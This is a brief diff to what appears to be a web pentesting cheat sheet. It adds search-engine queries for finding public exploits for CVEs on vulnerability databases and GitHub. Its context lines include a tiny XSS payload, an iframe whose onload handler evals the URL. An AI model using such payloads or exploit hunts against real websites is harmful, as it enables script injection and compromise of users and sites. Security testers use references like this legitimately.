@@ -1040,5 +1040,7 @@ Tiny XSS Payloads:
 <iframe/onload​=eval('’'+URL)>
 
 
-
+Finding Exploits for public CVEs 🔍
+site:(https://patchstack.com/ | https://wpscan.com | https://wordfence.com) CVE-20xx-xxxxx
+site:(*.github.com | github.com) CVE-20xx-xxxxx
 
